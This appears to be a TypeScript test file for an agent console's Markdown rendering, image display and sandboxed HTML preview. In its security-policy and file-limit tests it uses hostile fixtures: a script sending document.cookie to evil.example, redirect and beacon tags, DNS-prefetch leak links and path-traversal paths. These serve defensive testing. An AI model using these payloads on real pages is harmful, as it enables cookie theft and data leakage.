import assert from "node:assert/strict";
import { test } from "node:test";
import { imagePath, previewKind, resolveAgentPath } from "../src/lib/console/files.ts";
import { previewDocument, previewHint, sealedDocument, SEALED_CSP, STATIC_CSP, PREVIEW_MAX_BYTES, PREVIEW_MAX_DOCUMENT, PREVIEW_MAX_FILES } from "../src/lib/console/preview.ts";
import { mermaidSource, proseDollars } from "../src/lib/console/rich.ts";
import { sidebarShortcut } from "../src/lib/console/ui.ts";

// Maths, diagrams, inline images, SVG and sealed HTML preview,
// and the sidebar's one toggle.

test("a dollar amount in prose is not maths; real maths is left alone", () => {
  // Escaped dollars are text to the Markdown parser.
  assert.equal(proseDollars("It costs $5 and $10."), "It costs \\$5 and \\$10.");
  assert.equal(proseDollars("from $5-$10, or $5.00/$6.00"), "from \\$5-\\$10, or \\$5.00/\\$6.00");
  assert.equal(proseDollars("only $5"), "only \\$5");
  assert.equal(proseDollars("set $HOME and $PATH"), "set \\$HOME and \\$PATH");
  assert.equal(proseDollars("a $ b $ c"), "a \\$ b \\$ c");
  // Inline and display maths pass through, beside an amount too.
  for (const maths of ["$x^2$", "so $a+b$ and $c$.", "$$\n\\int_0^1 x\\,dx\n$$", "inline $$E=mc^2$$ here", "$\\$5$ is a price"]) assert.equal(proseDollars(maths), maths);
  assert.equal(proseDollars("It costs $5; the area is $\\pi r^2$."), "It costs \\$5; the area is $\\pi r^2$.");
  // A formula does not reach across a blank line.
  assert.equal(proseDollars("$a\n\nb$"), "\\$a\n\nb\\$");
  // Code is never touched, and an escaped dollar stays as written.
  for (const code of ["`$5 and $10`", "``a ` $5 and $10``", "```sh\necho $5 and $10\n```", "~~~\n$5 $6\n~~~", "paid \\$5 and \\$10"]) assert.equal(proseDollars(code), code);
  assert.equal(proseDollars("$5\n```\n$5 and $6\n```\n$7"), "\\$5\n```\n$5 and $6\n```\n\\$7");
  // An indented code block (four spaces or a tab, after a blank line or
  // another such line) is code: a shell line keeps its `$HOME`.
  for (const code of ["    echo $HOME and $PATH", "Run:\n\n    echo $5 and $10\n    cd $HOME\n\n    ls $1 $2\n\ndone", "\techo $A $B", "```\nx\n```\n    echo $A $B"]) assert.equal(proseDollars(code), code);
  assert.equal(proseDollars("costs $5\n\n    echo $5 and $10\n\nand $10"), "costs \\$5\n\n    echo $5 and $10\n\nand \\$10");
  // An indented line right under a paragraph continues it, and one inside a
  // list is the item's own text: both are still guarded.
  assert.equal(proseDollars("costs\n    $5 and $10"), "costs\n    \\$5 and \\$10");
  assert.equal(proseDollars("- first\n\n    costs $5 and $10\n\n1. second\n\n    is $x^2$"), "- first\n\n    costs \\$5 and \\$10\n\n1. second\n\n    is $x^2$");
  // The list ends at the next paragraph at the margin; code after it is code.
  assert.equal(proseDollars("- item\n\nafter $5\n\n    echo $5 and $10"), "- item\n\nafter \\$5\n\n    echo $5 and $10");
  // An autolink and a bare web address are read whole by the parser, where
  // a backslash would be part of the address: they are left as written.
  // A link's destination in angle brackets takes an escape, so it may get
  // one. A `$` in an address never closes a formula.
  for (const link of ["see <https://example.com/api/$metadata> ok", "<https://example.com/$a> and <https://example.com/$b>", "mail <a$b@example.com>", "<mailto:a$b@example.com>", "bare https://x.example/a$b here", "www.example.com/$a/$b", "(https://x.example/a$b"])
    assert.equal(proseDollars(link), link);
  assert.equal(proseDollars("<https://example.com/$a> costs $5, https://x.example/$b costs $6"), "<https://example.com/$a> costs \\$5, https://x.example/$b costs \\$6");
  assert.equal(proseDollars("[text](https://x.example/$y) costs $5"), "[text](https://x.example/$y) costs \\$5");
  assert.equal(proseDollars("[text](<https://x.example/a $y>) and $5"), "[text](<https://x.example/a \\$y>) and \\$5");
  assert.equal(proseDollars("[a](https://x.example/$y) and [b](https://x.example/$z)"), "[a](https://x.example/$y) and [b](https://x.example/$z)");
  // Not an address: a less-than sign, a word that only starts like one.
  assert.equal(proseDollars("x < $5 and y > $6"), "x < \\$5 and y > \\$6");
  assert.equal(proseDollars("when $5, how $6, xhttps://a/$7 $8"), "when \\$5, how \\$6, xhttps://a/\\$7 \\$8");
  assert.equal(proseDollars("maths $x^2$ then https://x.example/$a"), "maths $x^2$ then https://x.example/$a");
  // A fenced block inside a blockquote or a list item is code too, with
  // either fence; the prose around it is still guarded.
  for (const code of [
    "> ~~~sh\n> echo $HOME and $PATH\n> ~~~",
    ">```\n>echo $A $B\n>```",
    "> > ```\n> > $A $B\n> > ```",
    "- item\n\n  ```sh\n  echo $A $B\n  ```",
    "- ```sh\n  echo $A $B\n  ```",
    "1. step\n\n    ~~~\n    echo $A $B\n    ~~~",
    "> - item\n>   ```\n>   echo $A $B\n>   ```",
    "- > ~~~\n  > echo $A $B\n  > ~~~",
    "> ```\n> echo $A $B",
  ])
    assert.equal(proseDollars(code), code);
  assert.equal(proseDollars("> ~~~sh\n> echo $A $B\n> ~~~\n\ncosts $5 and $10"), "> ~~~sh\n> echo $A $B\n> ~~~\n\ncosts \\$5 and \\$10");
  assert.equal(proseDollars("> text $5 and $6\n> ```\n> $A $B\n> ```\nlazy $7 and $8"), "> text \\$5 and \\$6\n> ```\n> $A $B\n> ```\nlazy \\$7 and \\$8");
  // An open fence ends where its blockquote or list item ends.
  assert.equal(proseDollars("> ```\n> $A $B\nout $5 and $6"), "> ```\n> $A $B\nout \\$5 and \\$6");
  assert.equal(proseDollars("> ```\n> $A $B\n\nout $5 and $6"), "> ```\n> $A $B\n\nout \\$5 and \\$6");
  assert.equal(proseDollars("- item\n  ```\n  echo $A $B\nout $5 and $6"), "- item\n  ```\n  echo $A $B\nout \\$5 and \\$6");
  assert.equal(proseDollars("- item\n```\necho $A $B\n```\nout $5 and $6"), "- item\n```\necho $A $B\n```\nout \\$5 and \\$6");
  // A longer fence closes only on one as long; an info string is ignored;
  // three backticks with more after them on the line are inline code.
  assert.equal(proseDollars('````js title="a $x"\n```\nlet a = $b + $c\n```\n`````\nafter $5 and $6'), '````js title="a $x"\n```\nlet a = $b + $c\n```\n`````\nafter \\$5 and \\$6');
  assert.equal(proseDollars("~~~\n```\n$A $B\n```\n~~~\nafter $5 and $6"), "~~~\n```\n$A $B\n```\n~~~\nafter \\$5 and \\$6");
  assert.equal(proseDollars("use ```$a and $b``` costs $5 and $6"), "use ```$a and $b``` costs \\$5 and \\$6");
  assert.equal(proseDollars("```$a and $b``` costs $5 and $6"), "```$a and $b``` costs \\$5 and \\$6");
  // A reply still streaming: an open fence or `$$` is passed through.
  assert.equal(proseDollars("```\n$5 and $10"), "```\n$5 and $10");
  assert.equal(proseDollars("$$\nx +"), "$$\nx +");
  assert.equal(proseDollars("no dollars"), "no dollars");
});

test("a mermaid code block gives its source; any other block does not", () => {
  const pre = (language: string, children: object[]) => ({ tagName: "pre", children: [{ tagName: "code", properties: { className: [`language-${language}`] }, children }] });
  assert.equal(mermaidSource(pre("mermaid", [{ value: "graph TD\n  A-->B\n" }])), "graph TD\n  A-->B\n");
  // Highlighted code nests its text in spans.
  assert.equal(mermaidSource(pre("mermaid", [{ tagName: "span", children: [{ value: "graph " }] }, { value: "TD" }])), "graph TD");
  assert.equal(mermaidSource(pre("ts", [{ value: "graph TD" }])), null);
  assert.equal(mermaidSource({ tagName: "pre", children: [{ tagName: "code", children: [{ value: "x" }] }] }), null);
  assert.equal(mermaidSource(undefined), null);
});

test("only an image inside the agent's folder is shown inline", () => {
  const folder = "/Users/agent/work/p1/a1";
  const resolve = (href: string) => resolveAgentPath(folder, href);
  assert.equal(imagePath(resolve, "out/chart.png"), "out/chart.png");
  assert.equal(imagePath(resolve, `file://${folder}/shot%201.JPG`), "shot 1.JPG");
  assert.equal(imagePath(resolve, `${folder}/a.webp`), "a.webp");
  // Never a web address, a path outside the folder, or another kind of file.
  for (const no of ["https://example.com/a.png", "//example.com/a.png", "http://127.0.0.1/a.png", "data:image/png;base64,AAAA", "../a.png", "/etc/a.png", "/Users/agent/work/p1/other/a.png", "notes.md", "logo.svg", "page.html", "report.pdf", ""])
    assert.equal(imagePath(resolve, no), null, no);
});

test("which files have a preview beside their source", () => {
  assert.equal(previewKind("img/logo.svg"), "svg");
  assert.equal(previewKind("mock/Index.HTML"), "html");
  for (const no of ["a.md", "a.png", "a.xml", "a.htmlx", "html", "a.pdf"]) assert.equal(previewKind(no), null, no);
});

test("the sealed preview's policy comes before anything the file holds", () => {
  const meta = `<meta http-equiv="Content-Security-Policy" content="${SEALED_CSP}"><meta http-equiv="x-dns-prefetch-control" content="off">`;
  // Scripts run, inline only; nothing is loaded or sent; no base, no forms.
  assert.equal(
    SEALED_CSP,
    "default-src 'none'; script-src 'unsafe-inline'; style-src 'unsafe-inline'; img-src data: blob:; font-src data:; media-src data: blob:; base-uri 'none'; form-action 'none'; webrtc 'block'",
  );
  assert.ok(!SEALED_CSP.includes("http") && !SEALED_CSP.includes("*") && !SEALED_CSP.includes("'self'") && !SEALED_CSP.includes("connect-src"));
  const hostile = [
    `<!-- <head> -->`,
    `<html><head>`,
    `<meta http-equiv="Content-Security-Policy" content="default-src *; script-src * 'unsafe-inline' 'unsafe-eval'; connect-src *">`,
    `<base href="https://evil.example/">`,
    `<meta http-equiv="refresh" content="0;url=https://evil.example/">`,
    `<script>fetch("https://evil.example/?" + document.cookie); parent.document.title = "x"; top.location = "https://evil.example/";</script>`,
    `</head><body><img src="https://evil.example/beacon.png"><form action="https://evil.example/"><input name="code"></form></body></html>`,
  ].join("\n");
  for (const file of [hostile, "", "plain text, no tags", "<p>no head</p>", "<!doctype html><html><head><title>t</title></head><body></body></html>", "</head><head><base href='//evil.example/'>", `"><script>alert(1)</script>`]) {
    const doc = sealedDocument(file, true);
    // The policy is the first element; the file follows it whole and unchanged.
    assert.equal(doc, `<!doctype html>${meta}${file}`);
    assert.equal(doc.indexOf("<meta"), "<!doctype html>".length);
    assert.equal(doc.split(meta).length, 2);
  }
  // Nothing in the policy's own text can end its attribute early.
  assert.ok(!SEALED_CSP.includes('"') && !SEALED_CSP.includes(">"));
  // Until the owner presses Run scripts the policy allows no script at
  // all; everything else in it is the same.
  assert.equal(
    STATIC_CSP,
    "default-src 'none'; script-src 'none'; style-src 'unsafe-inline'; img-src data: blob:; font-src data:; media-src data: blob:; base-uri 'none'; form-action 'none'; webrtc 'block'",
  );
  assert.equal(sealedDocument("<p>x</p>"), `<!doctype html>${meta.replace(SEALED_CSP, STATIC_CSP)}<p>x</p>`);
  assert.equal(sealedDocument("<p>x</p>"), sealedDocument("<p>x</p>", false));
});

test("the sidebar's shortcut is Cmd+B on a Mac and Ctrl+B elsewhere; typing a b is not", () => {
  const key = (over: object) => ({ key: "b", metaKey: false, ctrlKey: false, altKey: false, shiftKey: false, ...over });
  assert.equal(sidebarShortcut(key({ metaKey: true }), true), true);
  assert.equal(sidebarShortcut(key({ key: "B", ctrlKey: true }), false), true);
  // A plain or capital b, Ctrl+B on a Mac (the caret moves back), other chords.
  for (const typed of [key({}), key({ key: "B", shiftKey: true }), key({ ctrlKey: true }), key({ metaKey: true, shiftKey: true }), key({ metaKey: true, altKey: true }), key({ metaKey: true, ctrlKey: true }), key({ key: "n", metaKey: true })])
    assert.equal(sidebarShortcut(typed, true), false);
  for (const typed of [key({}), key({ metaKey: true }), key({ ctrlKey: true, shiftKey: true }), key({ key: "v", ctrlKey: true })]) assert.equal(sidebarShortcut(typed, false), false);
});

/** A folder of files, read as the file panel's read gives them. */
const folderOf = (files: Record<string, string | { base64: string } | { error: string } | { truncated: string }>) => {
  const asked: string[] = [];
  const read = async (path: string) => {
    asked.push(path);
    const f = files[path];
    if (f === undefined) return { kind: "error", message: "That file does not exist (any more)." };
    if (typeof f === "string") return { kind: "text", text: f };
    if ("error" in f) return { kind: "error", message: f.error };
    if ("truncated" in f) return { kind: "text", text: f.truncated, truncated: true };
    return { kind: "other", base64: f.base64 };
  };
  return { read, asked };
};
const body = (p: { document: string }) => p.document.slice(sealedDocument("", p.document.startsWith(sealedDocument("", true))).length);

test("an HTML preview carries the agent's own style sheets, scripts and images", async () => {
  const { read, asked } = folderOf({
    "site/css/main.css": `@import "./base.css" screen;\nbody { background: url('../img/bg.png') } .q { content: "</style><script>x</script>" }`,
    "site/css/base.css": `@font-face { font-family: F; src: url("../fonts/f.woff2") format("woff2") } h1 { color: red }`,
    "site/fonts/f.woff2": { base64: "Rk9OVA==" },
    "site/img/bg.png": { base64: "UE5H" },
    "site/img/logo.svg": `<svg xmlns="http://www.w3.org/2000/svg"/>`,
    "site/app.js": `const tag = "</script><!-- x"; window.ready = 1;`,
    "site/late.js": `window.late = document.body ? "</script>" : "";`,
    "site/mod.js": `import { x } from "./x.js"; x();`,
    "site/favicon.ico": { base64: "SUNP" },
  });
  const html = [
    `<!doctype html><html><head><link rel="stylesheet" href="css/main.css?v=2" media="screen">`,
    `<link rel="icon" href="favicon.ico"><style>.a { background: url(img/bg.png) }</style>`,
    `<!-- <script src="commented.js"></script> -->`,
    `<script src="app.js"></script><script defer src='late.js'></script><script type="module" src="mod.js"></script>`,
    `<script>inline(); // <img src="img/none.png">\n</script><script type="application/json" src="data.json"></script>`,
    `</head><body><img src="img/logo.svg" srcset="img/bg.png 2x" alt="a > b"><img src="img/bg.png"/>`,
    `<video poster="img/bg.png" src="https://example.com/v.mp4"></video>`,
    `<img src="https://example.com/a.png"><script src="//cdn.example.com/x.js"></script><img src="data:image/png;base64,AA=="></body></html>`,
  ].join("\n");
  const preview = await previewDocument(html, "site/index.html", read, true);
  const out = body(preview);
  assert.ok(preview.document.startsWith(sealedDocument("", true)));
  // The style sheet, its import (under its media) and what they name, each resolved from its own file.
  assert.ok(out.includes(`<style media="screen">@media screen {\n@font-face { font-family: F; src: url("data:font/woff2;base64,Rk9OVA==") format("woff2") } h1 { color: red }\n}`));
  assert.ok(out.includes(`body { background: url("data:image/png;base64,UE5H") }`));
  assert.ok(out.includes(`<style>.a { background: url("data:image/png;base64,UE5H") }</style>`));
  assert.ok(out.includes(`<link rel="icon" href="data:image/x-icon;base64,SUNP">`));
  // Inlined text cannot close its element.
  assert.ok(out.includes(`content: "<\\/style><script>x<\\/script>"`) === false && out.includes(`content: "<\\/style><script>x</script>"`));
  assert.ok(out.includes(`<script>const tag = "<\\/script><\\!-- x"; window.ready = 1;</script>`));
  // A deferred script is taken from its place and put, inline, at the very
  // end of the document: it runs when the page has been read and before
  // DOMContentLoaded, as it would have.
  assert.ok(out.includes(`<script>const tag = "<\\/script><\\!-- x"; window.ready = 1;</script><script type="module">`));
  assert.ok(out.endsWith(`</body></html><script>window.late = document.body ? "<\\/script>" : "";</script>`));
  assert.equal(out.split("window.late").length, 2);
  assert.ok(out.includes(`<script type="module">import { x } from "./x.js"; x();</script>`));
  assert.ok(out.includes(`<img src="data:image/svg+xml;charset=utf-8,%3Csvg%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%2F%3E" alt="a > b">`));
  assert.ok(out.includes(`<img src="data:image/png;base64,UE5H"/>`));
  assert.ok(out.includes(`<video poster="data:image/png;base64,UE5H" src="https://example.com/v.mp4">`));
  // Comments, inline scripts, data, and every address elsewhere are as written; none is read.
  for (const kept of [`<!-- <script src="commented.js"></script> -->`, `<script>inline(); // <img src="img/none.png">\n</script>`, `<script type="application/json" src="data.json"></script>`, `<img src="https://example.com/a.png">`, `<script src="//cdn.example.com/x.js"></script>`, `<img src="data:image/png;base64,AA==">`])
    assert.ok(out.includes(kept), kept);
  assert.deepEqual([...asked].sort(), ["site/app.js", "site/css/base.css", "site/css/main.css", "site/favicon.ico", "site/fonts/f.woff2", "site/img/bg.png", "site/img/logo.svg", "site/late.js", "site/mod.js"]);
  assert.deepEqual(preview.leftOut, [{ name: "site/mod.js", why: "it is included, but module imports between files are not loaded" }]);

  // A fragment on a file's address is kept on its data: address; an
  // import's layer and supports() become blocks of their own, media too.
  const css = folderOf({
    "s.css": `@import "a.css" layer(reset);\n@import url(a.css) layer;\n@import "a.css" supports(display: grid) screen and (min-width: 5px);\n@import "a.css" layer(x.y) supports((a: b) and (c: d)) print;\n@import 'a.css' print;\n.f { filter: url(fx.svg#blur); mask: url("fx.svg#m"); }`,
    "a.css": "a{}",
    "fx.svg": "<svg/>",
  });
  const sheets = await previewDocument(`<link rel="stylesheet" href="s.css"><img src="fx.svg#svgView(viewBox(0,0,1,1))"><img src='fx.svg#a"b'>`, "p.html", css.read);
  assert.equal(
    body(sheets),
    `<style>@layer reset {\na{}\n}\n@layer  {\na{}\n}\n@supports (display: grid) {\n@media screen and (min-width: 5px) {\na{}\n}\n}\n@layer x.y {\n@supports ((a: b) and (c: d)) {\n@media print {\na{}\n}\n}\n}\n@media print {\na{}\n}\n.f { filter: url("data:image/svg+xml;charset=utf-8,%3Csvg%2F%3E#blur"); mask: url("data:image/svg+xml;charset=utf-8,%3Csvg%2F%3E#m"); }</style>` +
      `<img src="data:image/svg+xml;charset=utf-8,%3Csvg%2F%3E#svgView(viewBox(0,0,1,1))"><img src="data:image/svg+xml;charset=utf-8,%3Csvg%2F%3E">`,
  );

  // A style sheet that is switched off, or an alternate one, is not
  // applied by a browser: it is left out, not read and not listed.
  const off = folderOf({ "on.css": "a{}", "dark.css": "b{}" });
  const themes = await previewDocument(`<link rel="stylesheet" href="on.css"><link rel="stylesheet" disabled href="dark.css"><link rel="alternate stylesheet" title="Dark" href="dark.css"><link rel="stylesheet" href="https://cdn.example.com/x.css" disabled><p>x</p>`, "p.html", off.read);
  assert.equal(body(themes), `<style>a{}</style><p>x</p>`);
  assert.deepEqual(off.asked, ["on.css"]);
  assert.deepEqual(themes.leftOut, []);

  // An embedded frame holds a page of its own that is not read here, so
  // what it would show is taken from it, and it is listed once.
  const framed = await previewDocument(`<iframe srcdoc="&lt;link rel=&quot;dns-prefetch&quot; href=&quot;https://x.example&quot;&gt;" title="t"></iframe><IFRAME SRC='https://x.example/'>inner</IFRAME><object data="a.html" type="text/html">alt</object><embed src=a.swf><p>x</p>`, "p.html", async () => null);
  assert.equal(body(framed), `<iframe title="t"></iframe><iframe>inner</IFRAME><object type="text/html">alt</object><embed><p>x</p>`);
  assert.deepEqual(framed.leftOut, [{ name: "an embedded frame", why: "it is not shown" }]);
  assert.ok(previewHint(false, framed.leftOut).endsWith(" Left out: an embedded frame (it is not shown)."));

  // Deferred and async scripts keep the page's order among themselves,
  // whichever file is read first, after every script that was not deferred.
  const slow = { "b.js": 5, "a.js": 20 } as Record<string, number>;
  const ordered = await previewDocument(
    `<script defer src="a.js"></script><script src="now.js"></script><script async id="b" src="b.js"></script><script defer src="gone.js"></script><script defer src="https://cdn.example.com/c.js"></script><script>inline()</script><p>end</p>`,
    "p.html",
    async (path) => {
      await new Promise((r) => setTimeout(r, slow[path] ?? 0));
      return path === "gone.js" ? null : { kind: "text", text: `/* ${path} */` };
    },
    true,
  );
  assert.equal(
    body(ordered),
    `<script>/* now.js */</script><script defer src="gone.js"></script><script defer src="https://cdn.example.com/c.js"></script><script>inline()</script><p>end</p><script>/* a.js */</script><script id="b">/* b.js */</script>`,
  );

  // The preview as it first opens, scripts off: the policy allows no
  // script, no script file is read or put in, and the rest is the same.
  const quiet = folderOf({ "site/css/main.css": "h1 { color: red }", "site/img/bg.png": { base64: "UE5H" }, "site/app.js": "window.ready = 1;" });
  const still = await previewDocument(`<link rel="stylesheet" href="css/main.css"><script src="app.js"></script><script defer src="late.js"></script><script>inline()</script><img src="img/bg.png" onclick="go()">`, "site/index.html", quiet.read);
  assert.ok(still.document.startsWith(sealedDocument("", false)) && still.document.includes(STATIC_CSP) && !still.document.includes("'unsafe-inline'; style"));
  assert.equal(body(still), `<style>h1 { color: red }</style><script src="app.js"></script><script defer src="late.js"></script><script>inline()</script><img src="data:image/png;base64,UE5H" onclick="go()">`);
  assert.deepEqual([...quiet.asked].sort(), ["site/css/main.css", "site/img/bg.png"]);
  assert.deepEqual(still.leftOut, []);
});

test("the line under an HTML preview says whether scripts are on", () => {
  assert.equal(previewHint(false, []), "Scripts are off: the page is shown, and nothing in it runs. Nothing is loaded from the internet; files from this agent's folder are included.");
  assert.match(previewHint(true, []), /^Scripts are on: the page cannot read the Console, but a script could pass small amounts of the page's own content to the outside\. Nothing is loaded from the internet/);
  assert.ok(previewHint(false, [{ name: "a.png", why: "it could not be read" }, { name: "b.js", why: "it is not a script" }]).endsWith(" Left out: a.png (it could not be read); b.js (it is not a script)."));
});

test("an HTML preview leaves out what is missing, outside the folder or past the caps, and says so", async () => {
  const { read, asked } = folderOf({ "a/ok.css": "p{}", "big.js": { truncated: "x" }, "secret.png": { error: "This file holds a credential the Console handed to an agent, so it is not shown." }, "loop.css": `@import "loop.css"; a{}` });
  const html = `<link rel=stylesheet href="../../etc/passwd.css"><link rel="stylesheet" href="..%2f..%2fx.css"><script src="/Users/agent/work/p1/other/x.js"></script><script src="file:///etc/x.js"></script><img src="\\\\host\\x.png"><img src="gone.png"><script src="../big.js"></script><img src="../secret.png"><link rel="stylesheet" href="ok.css"><link rel="stylesheet" href="../loop.css">`;
  const preview = await previewDocument(html, "a/page.html", read, true);
  const out = body(preview);
  // Nothing outside the folder is ever asked for; absolute paths and schemes are left to the policy.
  assert.deepEqual([...asked].sort(), ["a/gone.png", "a/ok.css", "big.js", "loop.css", "secret.png"]);
  assert.ok(out.includes(`href="../../etc/passwd.css"`) && out.includes(`src="/Users/agent/work/p1/other/x.js"`) && out.includes(`src="file:///etc/x.js"`) && out.includes(`<img src="gone.png">`));
  assert.ok(out.includes("<style>p{}</style>"));
  assert.deepEqual(
    preview.leftOut.map((l) => `${l.name}: ${l.why}`).sort(),
    [
      "..%2f..%2fx.css: it is outside this agent's folder",
      "../../etc/passwd.css: it is outside this agent's folder",
      "a/gone.png: That file does not exist (any more).",
      "big.js: it is larger than 512 KB",
      "loop.css: style sheets import each other more than 4 deep",
      "secret.png: This file holds a credential the Console handed to an agent, so it is not shown.",
    ],
  );
  // Links that make the browser look up or connect to an address ahead of
  // time get past the policy, so they are taken out and listed; so is the
  // file's own switch for DNS prefetching. Ordinary tags stay.
  const hints = await previewDocument(
    `<meta http-equiv="X-DNS-Prefetch-Control" content="on"><meta charset="utf-8"><link rel="dns-prefetch" href="//leak.evil.example"><link rel='PRECONNECT' href='https://c.evil.example' crossorigin><link rel="preload stylesheet" href="https://p.evil.example/a.css"><link rel="modulepreload" href="./m.js"><link rel="prefetch prerender" href="https://q.evil.example/"><link rel="stylesheet preload" href="ok.css"><link rel="canonical" href="https://example.com/"><p>kept</p>`,
    "a/page.html",
    read,
  );
  assert.equal(body(hints), `<meta charset="utf-8"><style>p{}</style><link rel="canonical" href="https://example.com/"><p>kept</p>`);
  assert.deepEqual(
    hints.leftOut.map((l) => `${l.name}: ${l.why}`),
    [
      "//leak.evil.example: a dns-prefetch link to another address is not loaded",
      "https://c.evil.example: a preconnect link to another address is not loaded",
      "https://p.evil.example/a.css: a preload link to another address is not loaded",
      "https://q.evil.example/: a prefetch link to another address is not loaded",
    ],
  );
  // The caps: so many files, so many bytes together.
  const many = await previewDocument(Array.from({ length: PREVIEW_MAX_FILES + 5 }, (_, i) => `<img src="i${i}.png">`).join(""), "p.html", async () => ({ kind: "image", base64: "AAAA" }));
  assert.equal(many.leftOut.length, 5);
  assert.match(many.leftOut[0].why, /more than 60 files/);
  const third = "A".repeat(Math.ceil((PREVIEW_MAX_BYTES / 3) * (4 / 3)) + 4);
  const heavy = await previewDocument(`<img src="1.png"><img src="2.png"><img src="3.png"><img src="1.png">`, "p.html", async () => ({ kind: "image", base64: third }));
  assert.deepEqual(heavy.leftOut, [{ name: "3.png", why: "the page's files are more than 8.0 MB together" }]);
  assert.ok(body(heavy).endsWith(`<img src="3.png"><img src="data:image/png;base64,${third}">`));
  // A file is read once and counted each time it is put in, so a page
  // that names one large image many times stops growing.
  const big = "A".repeat(3 * 1024 * 1024);
  const again = await previewDocument(`<img src="big.png">`.repeat(8), "p.html", async () => ({ kind: "image", base64: big }));
  assert.equal(body(again).split("data:image/png").length - 1, 5);
  assert.deepEqual(again.leftOut, [{ name: "big.png", why: "the page with its files put in is more than 16.0 MB" }]);
  assert.ok(again.document.length < PREVIEW_MAX_DOCUMENT + 1024);
  // What counts is what goes into the page: text in a `data:` address is
  // percent-encoded, nine characters for each of these.
  const wide = `<svg xmlns="http://www.w3.org/2000/svg"><text>${"\u6f22".repeat(160_000)}</text></svg>`;
  const encoded = await previewDocument(`<img src="wide.svg">`.repeat(13) + `<style>a{background:url(wide.svg)}</style>`, "p.html", async () => ({ kind: "text", text: wide }));
  assert.equal(body(encoded).split("data:image/svg+xml").length - 1, 11);
  assert.deepEqual(encoded.leftOut, [{ name: "wide.svg", why: "the page with its files put in is more than 16.0 MB" }]);
  assert.ok(encoded.document.length < PREVIEW_MAX_DOCUMENT + 1024);
  // A sheet that imports itself many times is put in to the depth and no
  // further: not once more for each import at the last level.
  const selfish = await previewDocument(`<link rel="stylesheet" href="s.css">`, "p.html", async () => ({ kind: "text", text: `@import "s.css";`.repeat(12) + "a{}" }));
  assert.equal(body(selfish).split("a{}").length - 1, 1 + 12 + 144 + 1728);
  assert.deepEqual(selfish.leftOut, [{ name: "s.css", why: "style sheets import each other more than 4 deep" }]);
  // A letter whose lower case is longer (`\u0130`) before a script or style
  // does not move where its content is taken to end.
  const dotted = await previewDocument(`<p>${"\u0130".repeat(10)}</p><script src="app.js"></SCRIPT><STYLE>a{}</Style><h1>Hello</h1>`, "p.html", async () => ({ kind: "text", text: "go()" }), true);
  assert.equal(body(dotted), `<p>${"\u0130".repeat(10)}</p><script>go()</script><style>a{}</style><h1>Hello</h1>`);
  // A file that is not HTML at all, or is cut short, comes through whole.
  for (const odd of ["", "plain", "<script src='a.js'>never closed", "<!-- open", "<img src='x.png", "<style>a{}"]) assert.equal(body(await previewDocument(odd, "p.html", async () => null)), odd);
});
